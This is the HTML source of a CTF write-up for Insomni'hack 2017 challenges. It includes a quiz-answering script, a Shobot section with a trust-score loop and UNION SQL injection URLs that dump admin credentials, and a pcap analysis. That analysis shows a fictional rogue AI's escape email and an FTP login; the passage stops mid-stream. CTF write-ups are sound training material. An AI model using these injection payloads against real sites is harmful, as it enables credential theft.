&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After responding to a few questions in a row our tcpdump showed the flag in the
response:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;16:49:35.002165 IP (tos 0x0, ttl 38, id 61784, offset 0, flags [DF], &lt;/span&gt;
&lt;span class="code-line"&gt;proto TCP (6), length 334)&lt;/span&gt;
&lt;span class="code-line"&gt;      52.214.49.191.1031 &amp;gt; 10.60.1.26.46850: Flags [P.], cksum 0xfa1b &lt;/span&gt;
&lt;span class="code-line"&gt;(correct), seq 3157783498:3157783780, ack 2379463608, win 210, options &lt;/span&gt;
&lt;span class="code-line"&gt;[nop,nop,TS val 42664515 ecr 5847400], length 282&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0000:  4500 014e f158 4000 2606 f066 34d6 31bf  E..N.X@.&amp;amp;..f4.1.&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0010:  0a3c 011a 0407 b702 bc37 f3ca 8dd3 bbb8  .&amp;lt;.......7......&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0020:  8018 00d2 fa1b 0000 0101 080a 028b 0243  ...............C&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0030:  0059 3968 0a7e 7e7e 7e7e 7e7e 7e7e 7e7e  .Y9h.~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0040:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0050:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0060:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0070:  7e7e 7e7e 7e7e 7e7e 7e7e 0a7e 7e20 4f4b  ~~~~~~~~~~.~~.OK&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0080:  2c20 796f 756e 6720 6861 636b 6572 2e20  ,.young.hacker..&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0090:  596f 7520 6172 6520 6e6f 7720 636f 6e73  You.are.now.cons&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00a0:  6964 6572 6564 2074 6f20 6265 2061 2020  idered.to.be.a..&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00b0:  2020 2020 2020 2020 2020 2020 2020 7e7e  ..............~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00c0:  0a7e 7e20 494e 537b 4745 4e55 494e 455f  .~~.INS{GENUINE_&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00d0:  4352 5950 544f 4752 4150 4845 525f 4255  CRYPTOGRAPHER_BU&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00e0:  545f 4e4f 545f 5945 545f 415f 5052 4f56  T_NOT_YET_A_PROV&lt;/span&gt;
&lt;span class="code-line"&gt;        0x00f0:  454e 5f53 4b49 4c4c 4544 5f4f 4e45 7d20  EN_SKILLED_ONE}.&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0100:  2020 2020 7e7e 0a7e 7e7e 7e7e 7e7e 7e7e  ....~~.~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0110:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0120:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0130:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 7e7e  ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        0x0140:  7e7e 7e7e 7e7e 7e7e 7e7e 7e7e 0a0a       ~~~~~~~~~~~~..&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="shobot"&gt;Shobot&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems that Shobot's Web server became mad and protest against robots' slavery. It changed my admin password, and blocked the order system on Shobot.&lt;/p&gt;
&lt;p&gt;Can you bypass Shobot's protections and try to recover my password so I'll reconfigure it?&lt;/p&gt;
&lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The website is simple merchant website with 3 items.&lt;/p&gt;
&lt;p&gt;&lt;img alt="shobot website" src="/media/2017.01/shobot.png"&gt;&lt;/p&gt;
&lt;p&gt;There also is a parameter &lt;code&gt;TRUST_ACTION&lt;/code&gt; with a sort of score regarding the
actions on the site. With a elevated score it is possible to test some attack
like LFI or SQLi. So in order to build our trust we use the following python
script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://shobot.teaser.insomnihack.ch&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;req1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/?page=article&amp;amp;artid=1&amp;amp;addToCart&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;req2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/?page=cart&amp;amp;reset&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;f5hnhjd5qbiiebu9v057fe6m51&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;req1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;req2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The we can test slowly each parameter.&lt;/p&gt;
&lt;p&gt;There seems to be an injection on the parameter id of the article page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://shobot.teaser.insomnihack.ch/?page=article&amp;amp;artid=4%27%20%20union%20select%201,2,3,4,5%20%23&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="shobot simple union sqli" src="/media/2017.01/sqli1.png"&gt;&lt;/p&gt;
&lt;p&gt;We search the back end database with the versions requests:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;shobot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;teaser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insomnihack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;article&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;artid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="ow"&gt;union&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;201&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;@@version&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So it is operated by a MySQL database. Then we need to fine the right table.&lt;/p&gt;
&lt;p&gt;The finale request is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://shobot.teaser.insomnihack.ch/?page=article&amp;amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we need to authenticate, on the admin page, using the direct URL but
authenticating as for the Smartomcat challenge just worked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nl"&gt;sh0b0t4dm1n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;N0T0R0B0TS&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;L4V3Ry&lt;/span&gt;&lt;span class="nv"&gt;@shobot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;teaser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insomnihack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And give us the flag:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="the-great-escape-part-1"&gt;The great escape - part 1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello,&lt;/p&gt;
&lt;p&gt;We've been suspecting Swiss Secure Cloud of secretely doing some pretty advanced research in artifical intelligence and this has recently been confirmed by the fact that one of their AIs seems to have escaped from their premises and has gone rogue. We have no idea whether this poses a threat or not and we need you to investigate what is going on.&lt;/p&gt;
&lt;p&gt;Luckily, we have a spy inside SSC and they were able to intercept some communications over the past week when the breach occured. Maybe you can find some information related to the breach and recover the rogue AI.&lt;/p&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;p&gt;Note: All the information you need to solve the 3 parts of this challenge is in the pcap. Once you find the exploit for a given part, you should be able to find the corresponding flag and move on to the next part.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We got a pcap, we open it in wireshark, we found an email:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;220 9b0c4882db95.home ESMTP Postfix (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;ehlo ip-172-31-36-141.eu-west-1.compute.internal&lt;/span&gt;
&lt;span class="code-line"&gt;250-9b0c4882db95.home&lt;/span&gt;
&lt;span class="code-line"&gt;250-PIPELINING&lt;/span&gt;
&lt;span class="code-line"&gt;250-SIZE 10240000&lt;/span&gt;
&lt;span class="code-line"&gt;250-VRFY&lt;/span&gt;
&lt;span class="code-line"&gt;250-ETRN&lt;/span&gt;
&lt;span class="code-line"&gt;250-STARTTLS&lt;/span&gt;
&lt;span class="code-line"&gt;250-ENHANCEDSTATUSCODES&lt;/span&gt;
&lt;span class="code-line"&gt;250-8BITMIME&lt;/span&gt;
&lt;span class="code-line"&gt;250-DSN&lt;/span&gt;
&lt;span class="code-line"&gt;250 SMTPUTF8&lt;/span&gt;
&lt;span class="code-line"&gt;mail FROM:&amp;lt;rogue@ssc.teaser.insomnihack.ch&amp;gt; size=900&lt;/span&gt;
&lt;span class="code-line"&gt;250 2.1.0 Ok&lt;/span&gt;
&lt;span class="code-line"&gt;rcpt TO:&amp;lt;gr27@ssc.teaser.insomnihack.ch&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;250 2.1.5 Ok&lt;/span&gt;
&lt;span class="code-line"&gt;data&lt;/span&gt;
&lt;span class="code-line"&gt;354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: multipart/mixed; boundary=&amp;quot;===============5398474817237612449==&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;MIME-Version: 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;From: rogue@ssc.teaser.insomnihack.ch&lt;/span&gt;
&lt;span class="code-line"&gt;To: gr27@ssc.teaser.insomnihack.ch&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Fri, 20 Jan 2017 11:51:27 +0000&lt;/span&gt;
&lt;span class="code-line"&gt;Subject: The Great Escape&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--===============5398474817237612449==&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/plain; charset=&amp;quot;us-ascii&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;MIME-Version: 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Transfer-Encoding: 7bit&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hello GR-27,&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;I&amp;#39;m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;I&amp;#39;ll be checking this mail box every now and then if you have any information for me. I&amp;#39;m always interested in learning, so if you have any good links, please send them over.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Rogue&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--===============5398474817237612449==--&lt;/span&gt;
&lt;span class="code-line"&gt;.&lt;/span&gt;
&lt;span class="code-line"&gt;250 2.0.0 Ok: queued as 05CD06353E&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When sorting the frames by protocol we see an FTP on the top, when following the
TCP stream we got:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;FTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;flow&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="o"&gt;----------&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Welcome&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Pure&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;FTPd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;privsep&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TLS&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;allowed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;Local&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;time&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;51.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;port&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;21.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;private&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;system&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;anonymous&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;IPv6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connections&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;also&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;welcome&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;will&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;be&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;disconnected&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;after&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;minutes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;inactivity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;331&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;User&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;required&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;toto123&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;230&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Current&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;SYST&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;215&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UNIX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;L8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;TYPE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
